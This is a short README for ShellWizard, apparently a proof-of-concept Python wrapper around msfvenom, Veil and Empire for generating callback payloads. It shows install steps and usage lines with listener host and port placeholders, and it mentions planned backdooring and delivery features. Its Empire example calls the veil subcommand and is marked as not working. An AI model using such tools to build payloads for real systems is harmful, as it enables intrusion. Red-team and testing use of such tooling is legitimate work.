
<h1 align="center">
  <br>
ShellWizard
  <br>
</h1>

<h4 align="center">Python wrapper for payload creation.</h4>
<h6 align="center">This tool is still in development and has plans to include significantly more funcionality. Is currently just a PoC.</h4>
<h6 align="center">Some of the future functionality includes better staging (wix building and backdooring) and delivery.</h4>

<p align="center">
  <a href="#install">Install</a> •
  <a href="#examples">Examples</a> •
  <a href="#related">Related</a> •
  <a href="#license">License</a>
</p>

## Install
```python
git clone https://github.com/byinarie/ShellWizard.git
pip3 install -r requirements.txt 
```

## Examples
* Help
```bash
python3 ShellWizard.py --help
python3 ShellWizard.py venom --help
python3 ShellWizard.py empire --help
python3 ShellWizard.py veil --help
```

* Generate a veil payload
```python
python3 ShellWizard.py veil -lhost LISTENER-IP -lport -LISTENER-PORT -veil-options ADDTIONAL-OPTIONS
```
* Generate a venom payload
```python
python3 ShellWizard.py venom -lhost LISTENER-IP -lport -LISTENER-PORT -msf-options ADDTIONAL-OPTIONS
```

* Generate an Empire Payload (needs updated to include lhost, listener creation/etc)
* Currently not working.
```python
python3 ShellWizard.py veil --empire-host EMPIRE-API --empire-user USER --empire-pass PASSWORD --empire-options ADDTIONAL-ARGUMENTS
```

## Related
* todo

## License

Creative Commons Zero v1.0 Universal

---

